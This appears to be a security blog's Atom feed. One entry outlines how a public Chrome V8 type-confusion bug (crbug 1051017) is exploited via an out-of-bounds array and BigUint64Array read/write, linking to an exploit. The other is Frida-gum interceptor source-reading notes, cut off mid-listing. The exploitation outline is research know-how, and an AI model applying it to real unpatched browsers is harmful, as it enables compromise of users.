<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="https://www.w3.org/2005/Atom">
  <title>o0xmuhe&#39;s blog</title>
  
  <subtitle>control $pc, control the world</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://o0xmuhe.me/"/>
  <updated>2020-06-19T16:35:20.264Z</updated>
  <id>http://o0xmuhe.me/</id>
  
  <author>
    <name>muhe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>crbug1051017 exploit</title>
    <link href="http://o0xmuhe.me/2020/06/05/crbug1051017-exploit/"/>
    <id>http://o0xmuhe.me/2020/06/05/crbug1051017-exploit/</id>
    <published>2020-06-05T11:30:27.000Z</published>
    <updated>2020-06-19T16:35:20.264Z</updated>
    
    <content type="html"><![CDATA[<h2 id="about"><a href="#about" class="headerlink" title="about"></a>about</h2><p>最近看到<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017" target="_blank" rel="noopener">crbug 1051017</a>公开了poc，这是一个品相很好的类型混淆，具体可以看原作者的漏洞报告，写得十分详细。</p><a id="more"></a><h2 id="how2exploit"><a href="#how2exploit" class="headerlink" title="how2exploit"></a>how2exploit</h2><p>因为<code>glazunov</code>的poc已经做到了oob array阶段了，所以通过布局一个BigUint64Array来任意地址读写即可，即利用方式参考<code>CVE-2020-6418</code>就可以了。</p><h2 id="full-exploit"><a href="#full-exploit" class="headerlink" title="full exploit"></a>full exploit</h2><p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/chrome_M80_crbug1051017" target="_blank" rel="noopener">exploit</a></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017" target="_blank" rel="noopener">crbug 1051017</a><br><a href="https://ray-cp.github.io/archivers/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">browser-pwn-cve-2020-6418漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;about&quot;&gt;&lt;a href=&quot;#about&quot; class=&quot;headerlink&quot; title=&quot;about&quot;&gt;&lt;/a&gt;about&lt;/h2&gt;&lt;p&gt;最近看到&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=1051017&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;crbug 1051017&lt;/a&gt;公开了poc，这是一个品相很好的类型混淆，具体可以看原作者的漏洞报告，写得十分详细。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
      <category term="v8" scheme="http://o0xmuhe.me/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>frida-gum代码阅读笔记</title>
    <link href="http://o0xmuhe.me/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>http://o0xmuhe.me/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/</id>
    <published>2019-11-15T09:54:02.000Z</published>
    <updated>2019-11-23T13:27:59.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言与预备知识"><a href="#0x00-前言与预备知识" class="headerlink" title="0x00 : 前言与预备知识"></a>0x00 : 前言与预备知识</h2><p><code>frida</code> :  frida是一个优秀的跨平台<code>Dynamic instrumentation toolkit</code>，具体可以看<a href="https://www.frida.re" target="_blank" rel="noopener">官网介绍</a></p><p><a href="https://www.ibm.com/developerworks/cn/linux/l-gobject/index.html" target="_blank" rel="noopener">GObject对象系统</a></p><a id="more"></a><p>GObject这个比较重要，因为frida框架底层的hook框架Frida-gum是纯c写的，为了实现一些面向对象的编程，使用了Gobject。</p><p>注：本篇主要是看<code>interceptor</code>这种hook方式，针对函数头，之后会有一篇针对<code>Stalker</code> 模式的分析。</p><h2 id="0x01-项目构架"><a href="#0x01-项目构架" class="headerlink" title="0x01 : 项目构架"></a>0x01 : 项目构架</h2><p>直接拉下来的代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">╭─muhe@muheMacBookPro ~/Code/frida ‹master*›</span><br><span class="line">╰─$ l</span><br><span class="line">total 137608</span><br><span class="line">drwxr-xr-x  29 muhe  staff   928B Nov 13 17:22 .</span><br><span class="line">drwxr-xr-x  90 muhe  staff   2.8K Nov  5 16:44 ..</span><br><span class="line">drwxr-xr-x  15 muhe  staff   480B Nov 15 18:23 .git</span><br><span class="line">-rw-r--r--   1 muhe  staff   383B Jan 21  2019 .gitignore</span><br><span class="line">-rw-r--r--   1 muhe  staff   886B Jan 21  2019 .gitmodules</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Nov 13 17:22 .vscode</span><br><span class="line">-rw-r--r--   1 muhe  staff   2.4K Jan 21  2019 COPYING</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.2K Nov  7 18:11 Makefile</span><br><span class="line">-rw-r--r--   1 muhe  staff    28K Nov  7 18:11 Makefile.linux.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    28K Nov  7 18:11 Makefile.macos.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    21K Nov  7 18:11 Makefile.sdk.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    84K Apr 29  2019 Makefile.toolchain.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.7K Nov  7 18:11 README.md</span><br><span class="line">drwxr-xr-x  10 muhe  staff   320B Nov 11 14:59 build</span><br><span class="line">drwxr-xr-x  61 muhe  staff   1.9K Jan 21  2019 capstone</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.0K Nov  7 18:11 config.mk</span><br><span class="line">drwxr-xr-x   9 muhe  staff   288B Jan 21  2019 frida-clr</span><br><span class="line">drwxr-xr-x  21 muhe  staff   672B Jan 21  2019 frida-core</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Nov 11 17:37 frida-gum</span><br><span class="line">drwxr-xr-x  15 muhe  staff   480B Jan 21  2019 frida-node</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Jan 21  2019 frida-python</span><br><span class="line">drwxr-xr-x  27 muhe  staff   864B Jan 21  2019 frida-qml</span><br><span class="line">drwxr-xr-x  10 muhe  staff   320B Jan 21  2019 frida-swift</span><br><span class="line">drwxr-xr-x  12 muhe  staff   384B Jan 21  2019 frida-tools</span><br><span class="line">-rw-r--r--   1 muhe  staff    25K Nov  7 18:11 frida.sln</span><br><span class="line">-rw-r--r--   1 muhe  staff   9.0K Nov 11 14:43 frida.srctrlbm</span><br><span class="line">-rw-r--r--   1 muhe  staff    67M Nov 11 14:43 frida.srctrldb</span><br><span class="line">-rw-r--r--   1 muhe  staff   6.1K Nov 11 14:35 frida.srctrlprj</span><br><span class="line">drwxr-xr-x  47 muhe  staff   1.5K Nov  7 18:11 releng</span><br></pre></td></tr></table></figure><p><code>frida-gum</code>是底层hook框架，跨平台；</p><p><code>frida-python</code> , <code>frida-node</code>啥的是 bindings，暂时不管，不理解原理看也看不懂；</p><p><code>capstone</code> 牛逼的反汇编框架，<code>frida-gum</code>中用到了，用于指令的读；</p><p><code>releng</code> 编译相关的；</p><p><code>frida-core</code>  server/agent相关；</p><p><code>frida-tools</code> 一些工具，比如frida-ps啥的。</p><p>重点是<code>frida-gum</code> ，这是理解这个框架的基础。</p><h2 id="0x02-阅读frida-gum-x86为例"><a href="#0x02-阅读frida-gum-x86为例" class="headerlink" title="0x02 : 阅读frida-gum (x86为例)"></a>0x02 : 阅读<code>frida-gum</code> (x86为例)</h2><p><code>frida-gum</code> 注释并不多，甚至可以说几乎没，好在他代码写得好，构架合理代码规范好，所以阅读起来多读几遍，总会看懂的。</p><h3 id="2-1-构架"><a href="#2-1-构架" class="headerlink" title="2.1. 构架"></a>2.1. 构架</h3><p>这个的框架的构架如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">total 200</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Nov 11 17:37 .</span><br><span class="line">drwxr-xr-x  29 muhe  staff   928B Nov 13 17:22 ..</span><br><span class="line">-rw-r--r--   1 muhe  staff    34B Jan 21  2019 .git</span><br><span class="line">-rw-r--r--   1 muhe  staff    70B Jan 21  2019 .gitignore</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Nov 11 17:37 .vscode</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.6K Jan 21  2019 COPYING</span><br><span class="line">drwxr-xr-x   5 muhe  staff   160B Jan 21  2019 bindings</span><br><span class="line">-rw-r--r--   1 muhe  staff   2.1K Jan 21  2019 config.h.in</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Jan 21  2019 ext</span><br><span class="line">drwxr-xr-x  85 muhe  staff   2.7K Jan 21  2019 gum</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.1K Jan 21  2019 gum-32.vcxproj</span><br><span class="line">-rw-r--r--   1 muhe  staff    16K Jan 21  2019 gum-32.vcxproj.filters</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.1K Jan 21  2019 gum-64.vcxproj</span><br><span class="line">-rw-r--r--   1 muhe  staff    16K Jan 21  2019 gum-64.vcxproj.filters</span><br><span class="line">-rw-r--r--   1 muhe  staff   8.5K Jan 21  2019 gum-common.props</span><br><span class="line">drwxr-xr-x   4 muhe  staff   128B Jan 21  2019 libs</span><br><span class="line">-rw-r--r--   1 muhe  staff   6.8K Jan 21  2019 meson.build</span><br><span class="line">-rw-r--r--   1 muhe  staff   190B Jan 21  2019 meson_options.txt</span><br><span class="line">drwxr-xr-x  28 muhe  staff   896B Jan 21  2019 tests</span><br><span class="line">drwxr-xr-x   7 muhe  staff   224B Jan 21  2019 vapi</span><br></pre></td></tr></table></figure><p>核心是在gum目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gum</span><br><span class="line">├── arch-arm</span><br><span class="line">├── arch-arm64</span><br><span class="line">├── arch-mips</span><br><span class="line">├── arch-x86</span><br><span class="line">├── backend-arm</span><br><span class="line">├── backend-arm64</span><br><span class="line">├── backend-darwin</span><br><span class="line">├── backend-dbghelp</span><br><span class="line">├── backend-elf</span><br><span class="line">├── backend-libdwarf</span><br><span class="line">├── backend-libunwind</span><br><span class="line">├── backend-linux</span><br><span class="line">├── backend-mips</span><br><span class="line">├── backend-posix</span><br><span class="line">├── backend-qnx</span><br><span class="line">├── backend-windows</span><br><span class="line">└── backend-x86</span><br><span class="line">....// gum下其他文件</span><br></pre></td></tr></table></figure><p>这里有必要说一下，<code>frida-gum</code> 为了实现跨平台，抽象出来 <code>构架无关/平台无关/系统无关</code>的api，比如一些内存操作，在<code>frida-gum</code>里可能就是<code>gum_xxxxx</code>，但是根据不同平台，调用到对应平台的api里去，正是做了很好的封装，上层代码才会看起来“平台无关”。</p><p>还有几个核心的对象，后面的代码里频繁提及：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GumInterceptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  GObject parent;</span><br><span class="line"></span><br><span class="line">  GRecMutex mutex;</span><br><span class="line"></span><br><span class="line">  GHashTable * function_by_address;</span><br><span class="line"></span><br><span class="line">  GumInterceptorBackend * backend;</span><br><span class="line">  GumCodeAllocator allocator;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">volatile</span> guint selected_thread_id;</span><br><span class="line"></span><br><span class="line">  GumInterceptorTransaction current_transaction;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从这个拦截器类索引出去的对象都需要好好注意，比如 <code>GumInterceptorBackend</code> , 最好可以生成一个uml图，阅读代码的时候对比着看。</p><h3 id="2-2-代码阅读"><a href="#2-2-代码阅读" class="headerlink" title="2.2. 代码阅读"></a>2.2. 代码阅读</h3><h4 id="2-2-1-准备工作"><a href="#2-2-1-准备工作" class="headerlink" title="2.2.1 准备工作"></a>2.2.1 准备工作</h4><p>面对比较大的代码，重要的是找到一个入口，从这个点开始读，我这里大概看了下单元测试的代码，发现基本是: 初始化，测试各种功能，清理，退出。</p><p>那么我的阅读思路就是 : </p><ol><li>初始化部分</li><li>各种功能，比如 内存模块，指令读写模块，代码修复模块</li><li>清理 这部分大概过一下就行</li></ol><p>这里我参考了 <code>jmpews</code>师傅的关于设计hook框架的文章，了解一个hook框架如何设计，分哪些模块，在阅读代码的时候能够有针对性一些。</p><ul><li>内存分配 模块 </li><li>指令写 模块 </li><li>指令读 模块 </li><li>指令修复 模块 relocator </li><li>跳板 模块 </li><li>调度器 模块 enter_thunk部分实现 </li><li>栈 模块</li></ul><p>具体可以参考他的文章: <a href="https://bbs.pediy.com/thread-220794.htm" target="_blank" rel="noopener">如何构建一款像 frida 一样的框架</a></p><h4 id="2-2-2-hook从0到1"><a href="#2-2-2-hook从0到1" class="headerlink" title="2.2.2 hook从0到1"></a>2.2.2 hook从0到1</h4><p>阅读顺序根据单元测试<code>gum-test.c</code>确定的，具体的可以看代码</p><h5 id="gum-interceptor-obtain"><a href="#gum-interceptor-obtain" class="headerlink" title="gum_interceptor_obtain()"></a>gum_interceptor_obtain()</h5><p>这部分是 拦截器初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化 interceptor 对象初始化</span></span><br><span class="line">GumInterceptor *</span><br><span class="line">gum_interceptor_obtain (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  GumInterceptor * interceptor;</span><br><span class="line"></span><br><span class="line">  g_mutex_lock (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_the_interceptor != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    interceptor = GUM_INTERCEPTOR (g_object_ref (_the_interceptor));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _the_interceptor = g_object_new (GUM_TYPE_INTERCEPTOR, <span class="literal">NULL</span>);</span><br><span class="line">    g_object_weak_ref (G_OBJECT (_the_interceptor),</span><br><span class="line">        the_interceptor_weak_notify, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    interceptor = _the_interceptor;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  g_mutex_unlock (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> interceptor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_init (GumInterceptor * self)</span><br><span class="line">&#123;</span><br><span class="line">  g_rec_mutex_init (&amp;self-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  self-&gt;function_by_address = g_hash_table_new_full (<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">      (GDestroyNotify) gum_function_context_destroy);</span><br><span class="line"></span><br><span class="line">4<span class="comment">// 分配器初始化</span></span><br><span class="line">  gum_code_allocator_init (&amp;self-&gt;allocator, GUM_INTERCEPTOR_CODE_SLICE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建拦截器后端</span></span><br><span class="line">  self-&gt;backend = _gum_interceptor_backend_create (&amp;self-&gt;allocator);</span><br><span class="line"></span><br><span class="line">  gum_interceptor_transaction_init (&amp;self-&gt;current_transaction, self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为GObject的使用，<code>gum_interceptor_init</code> 这个构造函数，在 <code>interceptor</code>对象创建出来的时候触发。</p><p>重点看拦截器后端的初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GumInterceptorBackend *</span><br><span class="line">_gum_interceptor_backend_create (GumCodeAllocator * allocator)</span><br><span class="line">&#123;</span><br><span class="line">  GumInterceptorBackend * backend;</span><br><span class="line"></span><br><span class="line">  backend = g_slice_new (GumInterceptorBackend);</span><br><span class="line">  backend-&gt;allocator = allocator;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//初始化 codewriter和relocator</span></span><br><span class="line">  gum_x86_writer_init (&amp;backend-&gt;writer, <span class="literal">NULL</span>);</span><br><span class="line">  gum_x86_relocator_init (&amp;backend-&gt;relocator, <span class="literal">NULL</span>, &amp;backend-&gt;writer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建 thunk</span></span><br><span class="line">  gum_interceptor_backend_create_thunks (backend);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> backend;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里初始化的<code>writer</code>和<code>relocator</code>分别用于指令写和指令恢复。</p><p><code>thunks</code>的初始化，这两个是用于调度执行，分别对应 进入hook和离开hook。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_backend_create_thunks (GumInterceptorBackend * self)</span><br><span class="line">&#123;</span><br><span class="line">  GumX86Writer * cw = &amp;self-&gt;writer;</span><br><span class="line"></span><br><span class="line">  self-&gt;enter_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator);</span><br><span class="line">  gum_x86_writer_reset (cw, self-&gt;enter_thunk-&gt;data);</span><br><span class="line">  gum_emit_enter_thunk (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;enter_thunk-&gt;<span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">  self-&gt;leave_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator);</span><br><span class="line">  gum_x86_writer_reset (cw, self-&gt;leave_thunk-&gt;data);</span><br><span class="line">  gum_emit_leave_thunk (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;leave_thunk-&gt;<span class="built_in">size</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为原理类似，只举例<code>enter_thunk</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_emit_enter_thunk (GumX86Writer * cw)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> gssize return_address_stack_displacement = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// save ret addr</span></span><br><span class="line">  gum_emit_prolog (cw, return_address_stack_displacement);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构造自己的函数栈</span></span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XSI,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_CPU_CONTEXT);</span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XDX,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_TOP);</span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XCX,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_NEXT_HOP);</span><br><span class="line"></span><br><span class="line">  gum_x86_writer_put_call_address_with_aligned_arguments (cw, GUM_CALL_CAPI,</span><br><span class="line">      GUM_ADDRESS (_gum_function_context_begin_invocation), <span class="number">4</span>,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XBX,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XSI,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XDX,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XCX);</span><br><span class="line"></span><br><span class="line">  gum_emit_epilog (cw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="gum-interceptor-attach-listener"><a href="#gum-interceptor-attach-listener" class="headerlink" title="gum_interceptor_attach_listener"></a>gum_interceptor_attach_listener</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach_listener (GumInterceptor * self,</span><br><span class="line">                                 gpointer function_address,</span><br><span class="line">                                 GumInvocationListener * listener,</span><br><span class="line">                                 gpointer listener_function_data)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="gum-interceptor-transaction-begin"><a href="#gum-interceptor-transaction-begin" class="headerlink" title="gum_interceptor_transaction_begin"></a>gum_interceptor_transaction_begin</h6><h6 id="gum-interceptor-instrument-✨"><a href="#gum-interceptor-instrument-✨" class="headerlink" title="gum_interceptor_instrument ✨"></a>gum_interceptor_instrument ✨</h6><p>这里要说的是 function_address 就是要hook的目标函数，<code>frida-gum</code>把要hook的目标封装成了 <code>GumFunctionContext</code>对象，方便操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function_address = gum_interceptor_resolve (self, function_address); <span class="comment">// ?</span></span><br><span class="line">  <span class="comment">// 创建跳板</span></span><br><span class="line">  function_ctx = gum_interceptor_instrument (self, function_address);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> GumFunctionContext *</span><br><span class="line">gum_interceptor_instrument (GumInterceptor * self,</span><br><span class="line">                            gpointer function_address)</span><br><span class="line">&#123;</span><br><span class="line">  GumFunctionContext * ctx;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 要hook的函数，封装成了 GumFunctionContext，此时</span></span><br><span class="line">  <span class="comment">// 根据 地址，得到与之对应的 GunFunctionContext对象</span></span><br><span class="line">  ctx = (GumFunctionContext *) g_hash_table_lookup (self-&gt;function_by_address,</span><br><span class="line">      function_address);</span><br><span class="line">  <span class="keyword">if</span> (ctx != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> ctx;</span><br><span class="line">  <span class="comment">// 如果获取到的是空的对象，必须初始化了才能使用</span></span><br><span class="line">  <span class="comment">// 只写几个字断，分配内存/hook的函数地址/interceptor成员</span></span><br><span class="line">  ctx = gum_function_context_new (self, function_address);</span><br><span class="line">  <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">// 创建跳板</span></span><br><span class="line">  <span class="keyword">if</span> (!_gum_interceptor_backend_create_trampoline (self-&gt;backend, ctx))</span><br><span class="line">  &#123;</span><br><span class="line">    gum_function_context_finalize (ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置完成后， 添加到哈希表</span></span><br><span class="line">  <span class="comment">// hash_table, key, value</span></span><br><span class="line">  <span class="comment">// hook函数地址，GumFunctionContext对象对应， 方便查找</span></span><br><span class="line">  g_hash_table_insert (self-&gt;function_by_address, function_address, ctx);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当前 transaction 添加到 任务中， 设置回调 函数 gum_interceptor_activate 拦截器激活函数</span></span><br><span class="line">  gum_interceptor_transaction_schedule_prologue_write (</span><br><span class="line">      &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ctx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里贴一下跳板代码方便理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00C30200  mov         al,byte ptr ds:[FF00C121h]  </span><br><span class="line">00C30205  xor         eax,0C30200h  </span><br><span class="line">00C3020A  jmp         00C30000   // 跳到上面的 enter_thunk</span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  // 跳到 leave_thunk</span><br><span class="line">// 原函数修复的指令，7个字节</span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         